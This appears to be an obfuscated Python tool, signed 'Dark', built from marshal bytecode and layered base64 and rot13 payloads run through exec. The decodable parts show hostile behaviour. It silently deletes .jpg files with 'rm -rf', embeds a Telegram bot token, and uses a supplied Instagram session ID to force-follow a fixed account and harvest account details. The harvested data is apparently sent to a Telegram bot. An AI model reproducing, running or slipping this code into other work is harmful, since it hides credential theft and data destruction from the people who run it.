import marshal
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00sb\x00\x00\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x02Z\x02d\x03Z\x03d\x04Z\x04d\x05Z\x05d\x06Z\x06e\x07d\x07\x83\x01e\x07d\x08\x83\x01\x17\x00e\x07d\t\x83\x01\x17\x00e\x07d\n\x83\x01\x17\x00Z\x08e\x07e\te\x00\xa0\ne\x07d\x0b\x83\x01\xa1\x01d\x0cd\r\x83\x03\x83\x01\x01\x00d\x01S\x00)\x0e\xe9\x00\x00\x00\x00Na\xcd\r\x00\x00cHJpbnQoJ1wwMzNbMTs5Mm08PDw8PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT4+Pj4nKQpsb2dvID0gJ1wwMzNbMTszN20gICAgICAgICAgICAgIDcxODYxNyAgICAgICAgICAgICAgIDc3MTg2MyAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgODg4ODg4ODk3ICAgICAgICAgICAgNzg4ODg4ODg4ICAgICAgICAgICAgXG4gICAgICAgICAgICA2NDc3NzE4ODg4ODcgICAgICAgIDM4ODg4ODM3Nzc4MyAgICAgICAgICAgXG4gICAgICAgICAgICAgICAgICAgIDc4ODgzICAgICAgODg4NiAgICAgICAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgICAgICAgICAgIDggICAgICAgNzggICAgICAgICAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgICAzNzM3NzM3ICA3ICAgICAgNyAgNzE3Mzc3NyAgICAgICAgICAgICAgXG4gICAgICAgICAgICA3Mzg0ODg4ODg4ODggICAgICAgIDg4ODg4ODg4NDg3NyAgICAgICAgICAgXG4gICAgICAgICAgIDc3Nzc3MjQ3NzM3NyAgMyAgIDc3ICA3NzE3MTExNzc3NzcgICAgICAgICAgXG4gICAgICAgICAgICAgICAgICAgICAgICAgOCAgICA4ICAgICAgICAgICAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgICAgICAgICAgICA4OCAgICA4OCAgICAgICAgICAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgICAgICAgICAgNzE3OCAgICA4NzQgICAgICAgICAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgICAgICAgMzQ3NyAgNCAgICA4ICA3Nzg3ICAgICAgICAgICAgICAgICAgXG4gICAgICAgICAgIDA4IDQ3IDc3NyAgICA3NyAgICAzICAgICA3NzcgMzM3ODcgICAgICAgICAgXG4gICAgICAgICAgICA4Nzc4NyAgICAgICAgNzMxMTM3ICAgICAgICAzOCA4OCAgICAgICAgICAgXG4gICAgICAgICAgICAgOCAgODQgICAgICA4ODg3MTg4MSAgICAgIDg4IDc4ICAgICAgICAgICAgXG4gICAgICAgICAgICAgIDggIDg4ODg4ODg4OCAgIDc4ODg4ODg4ODggNzggICAgICAgICAgICAgXG4gICAgICAgICAgICAgICA4NyAgICAgIDc3Nzc3Nzc3NzcgICAgICA0OCAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgICAgNjcgICAgICAgICAgICAgICAgICAgIDcxICAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgICAgIDc3ICAgICAgIDMxMTcgICAgICAgNzcgICAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgICAgICAgNyAgICAgIDc4OCAgICAgICA3ICAgICAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgICAgICAgICAgICAgIDM4ODcgICAgICAgICAgICAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgICAgICAgICAgICAgIDg4ODcgICAgICAgICAgICAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgICAgICAgICAgICAgIDM4OCAgICAgICAgICAgICAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgICAgICAgICAgICAgICA4OCAgICAgICAgICAgICAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAxNycKcHJpbnQobG9nbykKcHJpbnQoJ1wwMzNbMTs5Mm08PDw8PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT4+Pj4nKQpwcmludCgnICAgICAgICAgQnkgOiAgICAgICAgICAgICBcMDMzWzE7MzdtRGFyayAnKQpwcmludCgnXDAzM1sxOzkybTw8PDw9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Pj4+PicpCnRyeToKCWltcG9ydCAgc3lzLCBvcywgcmFuZG9tLCB0aW1lLCB1c2VyX2FnZW50LHNlY3JldHMscmVxdWVzdHMsanNvbix1dWlkLHdnZXQsdXNlcl9hZ2VudApleGNlcHQ6cGFzcwoKdHJ5OgoJaW1wb3J0IHV1aWQKCWltcG9ydCB1c2VyX2FnZW50CglpbXBvcnQgd2dldAoJaW1wb3J0IHJlcXVlc3RzCglmcm9tIHNlY3JldHMgaW1wb3J0IHRva2VuX2hleAoJZnJvbSB1dWlkIGltcG9ydCB1dWlkNAoJZnJvbSB1c2VyX2FnZW50IGltcG9ydCBnZW5lcmF0ZV91c2VyX2FnZW50Cglmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCAKZXhjZXB0IEltcG9ydEVycm9yIGFzIERhcms6Cglvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJykKCW9zLnN5c3RlbSgncGlwIGluc3RhbGwgYnM0JykKCW9zLnN5c3RlbSgicGlwIGluc3RhbGwgdXNlcl9hZ2VudCIpCglvcy5zeXN0ZW0oInBpcCBpbnN0YWxsIHdnZXQiKQplbHNlOnBhc3MKZm9yIERhcmtUb29scyBpbiBvcy5saXN0ZGlyKCk6CglpZiAnLmpwZycgaW4gRGFya1Rvb2xzOgoJCXRyeTpvcy5yZW1vdmUoRGFya1Rvb2xzKQoJCWV4Y2VwdDpwYXNzCgkJb3Muc3lzdGVtKGYicm0gLXJmIHtEYXJrVG9vbHN9IikKCWVsc2U6cGFzcyAgICAKCkEgPSAiXDAzM1sxOzkxbSIKQiA9ICJcMDMzWzE7OTBtIgpDID0gIlwwMzNbMTs5N20iCkUgPSAiXDAzM1sxOzkybSIKSCA9ICJcMDMzWzE7OTNtIgpLID0gIlwwMzNbMTs5NG0iCkwgPSAiXDAzM1sxOzk1bSIKTSA9ICJcMDMzWzE7OTZtIgpRID0gIigiClcgPSAiKSIKcz1yZXF1ZXN0cy5TZXNzaW9uKCkKCmRlZiBUb3Aocyk6Cglmb3IgQVNVIGluIHMgKyAnXG4nOgoJCXN5cy5zdGRvdXQud3JpdGUoQVNVKQoJCXN5cy5zdGRvdXQuZmx1c2goKQoJCXNsZWVwKDUwLiAvIDcwMCkKCQkKCnRva2VuID0iMjA2NjY0ODE2NjpBQUU0NjdMUFczNk5Yaa\xcd\r\x00\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\xcd\r\x00\x00csCiAgICAgICAgICAgICAgICAncmVmZXJlcic6ICdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL19wYXB1bGFrYW1fXzAvZm9sbG93LycsCiAgICAgICAgICAgICAgICAnc2VjLWNoLXVhJzogJyJHb29nbGUgQ2hyb21lIjt2PSI4OSIsICJDaHJvbWl1bSI7dj0iODkiLCAiO05vdCBBIEJyYW5kIjt2PSI5OSInLAogICAgICAgICAgICAgICAgJ3NlYy1jaC11YS1tb2JpbGUnOiAnPzAnLCdzZWMtZmV0Y2gtZGVzdCc6ICdlbXB0eScsCiAgICAgICAgICAgICAgICAnc2VjLWZldGNoLW1vZGUnOiAnY29ycycsCiAgICAgICAgICAgICAgICAnc2VjLWZldGNoLXNpdGUnOiAnc2FtZS1vcmlnaW4nLAogICAgICAgICAgICAgICAgJ3VzZXItYWdlbnQnOiBzdHIoRGFya2FEMCksCiAgICAgICAgICAgICAgICAneC1jc3JmdG9rZW4nOiAnd1lQYUZJNFUxb3NxT2lYYzJUdjV2T3NOZ1RkQndyeGknLAogICAgICAgICAgICAgICAgJ3gtaWctYXBwLWlkJzogJzkzNjYxOTc0MzM5MjQ1OScsCiAgICAgICAgICAgICAgICAneC1pZy13d3ctY2xhaW0nOiAnaG1hYy5BUjBFV3ZqaXhfWHNxQUlqQXQ3ZmpMM3FMd1FLQ1JUQjhVTVhUR0w1ajdwa2dZa3EnLAogICAgICAgICAgICAgICAgJ3gtaW5zdGFncmFtLWFqYXgnOiAnNzUzY2U4NzhjZDZkJywKICAgICAgICAgICAgICAgICd4LXJlcXVlc3RlZC13aXRoJzogJ1hNTEh0dHBSZXF1ZXN0J30KCQkJCURhcmtfZGF0YSA9IHsnX19hJzogJzEnfQoJCQkJRGFya191cmwgPSAnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS93ZWIvZnJpZW5kc2hpcHMvNDQ3MjcyNTcwMDcvZm9sbG93LycKCQkJCXRyeToKCQkJCQlyZXF1ZXN0cy5wb3N0KERhcmtfdXJsLGhlYWRlcnM9RGFya19oYWRyZXMpCgkJCQkJCgkJCQlleGNlcHQ6cGFzcwoJCQkJRGFya19oYWRyZXMyID0gewogICAgICAgICAgICAgICAgJ2FjY2VwdCc6ICcqLyonLAogICAgICAgICAgICAgICAgJ2FjY2VwdC1lbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlLCBicicsCiAgICAgICAgICAgICAgICAnYWNjZXB0LWxhbmd1YWdlJzogJ2FyLGVuLVVTO3E9MC45LGVuO3E9MC44JywKICAgICAgICAgICAgICAgICdjb29raWUnOiAnaWdfZGlkPTNFNzBEQjkzLTRBMjctNDNFQi04NDYzLUUwQkZDOUIwMkFFMTsgbWlkPVlDQWFkQUFMQUFIMzVnXzdlN2gwU3dCYkZ6QnQ7IGlnX25yY2I9MTsgY3NyZnRva2VuPVpjNHRtNUQ3UU5MMWhpTUdKMWNhTFQ3RE5QVFlIcUgwOyBkc191c2VyX2lkPTQ1MzM0NzU3MjA1OyBzZXNzaW9uaWQ9JytzdHIoQ29kX0RhcmspKyc7IHJ1cj1WTEwnLCdyZWZlcmVyJzogJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vYWNjb3VudHMvZWRpdC8nLAogICAgICAgICAgICAgICAgJ3NlYy1mZXRjaC1kZXN0JzogJ2VtcHR5JywKICAgICAgICAgICAgICAgICdzZWMtZmV0Y2gtbW9kZSc6ICdjb3JzJywKICAgICAgICAgICAgICAgICdzZWMtZmV0Y2gtc2l0ZSc6ICdzYW1lLW9yaWdpbicsCiAgICAgICAgICAgICAgICAnVXNlci1BZ2VudCc6IHN0cihEYXJrYUQwKSwKICAgICAgICAgICAgICAgICd4LWlnLWFwcC1pZCc6ICc5MzY2MTk3NDMzOTI0NTknLAogICAgICAgICAgICAgICAgJ3gtaWctd3d3LWNsYWltJzogJ2htYWMuQVIzUDhlQTQ1ZzVFTEwzbHFkSW0tREhLWTJNU1lfa0dXa04wdEdFd0cyS3M5TmNsJywKICAgICAgICAgICAgICAgICd4LXJlcXVlc3RlZC13aXRoJzogJ1hNTEh0dHBSZXF1ZXN0J30KCQkJCURhcmtfdXJsMiA9ICdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL2FjY291bnRzL2VkaXQvP19fYT0xJwoJCQkJUmVzcG9uc2VfRGFyazIgPSByZXF1ZXN0cy5nZXQoRGFya191cmwyLCBkYXRhPURhcmtfZGF0YSwgaGVhZGVycz1EYXJrX2hhZHJlczIpCgkJCQl1c2VyeCA9IHN0cihSZXNwb25zZV9EYXJrMi5qc29uKClbJ2Zvcm1fZGF0YSddWyd1c2VybmFtZSddKQoJCQkJX0RhcmtfdXJsXyA9ICJodHRwczovL3d3dy5pbnN0YWdyYW0uY29tLyIrc3RyKHVzZXJ4KSsiP2hsPWVuIgoJCQkJX1N0cmF0XyA9IHJlcXVlc3RzLmdldChfRGFya191cmxfLGhlYWRlcnMgPSB7J1VzZXItYWdlbnQnOiAneW91ciBib3QgMC4xJ30pLnRleHQKCQkJCXNvdXAgPSBCZWF1dGlmdWxTb3VwKF9TdHJhdF8sJ2h0bWwucGFyc2VyJykKCQkJCWRlc2NyaXB0aW9uID0gc291cC5maW5kKCJtZXRhIiwgcHJvcGVydHk9Im9nOmRlc2NyaXB0aW9uIikKCQkJCXBvc3RzID0gZGVzY3JpcHRpb25bImNvbnRlbnQiXS5zcGxpdCgiLCIpWzJdLnNwbGl0KCItIilbMF0KCQkJCWNvb2tpaWUgPSBzZWNyZXRzLnRva2VuX2hleCg4KSoyCgkJCQloZWFkID0gewogICAgICAgICAgICAgICAnSE9TVCc6ICJ3d3cuaW5zdGFncmFtLmNvbSIsCiAgICAgICAgICAgICAgICdLZWVwQWxpdmUnIDogJ1RydWUnLAogICAgICAgICAgICAgICAndXNlci1hZ2VudCcgOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS80Ny4wLjI1MjYuNzMgU2FmYXJpLzUzNy4zNiIsCiAgICAgICAgICAgICAgICdDb29raWUnOiBjb29raWllLAogICAgICAgICAgICAgICAnQWNjZXB0JyA6ICIqLyoiLAogICAgICAgICAgICAgICAnQ29udGVudFR5cGUnIDogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIa\xcd\r\x00\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\xda\x05rot13\xda\x05magicz\x18codecs.decode(love, joy)\xda\x03godz\x1bcodecs.decode(destiny, joy)\xda\x05trustz\x08<string>\xda\x04exec)\x0b\xda\x06base64\xda\x06codecsr\x03\x00\x00\x00Z\x04lover\x04\x00\x00\x00Z\x07destinyZ\x03joy\xda\x04evalr\x05\x00\x00\x00\xda\x07compileZ\tb64decode\xa9\x00r\x0b\x00\x00\x00r\x0b\x00\x00\x00\xfa\x01 \xda\x08<module>\x01\x00\x00\x00s\x0e\x00\x00\x00\x10\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01 \x01'))
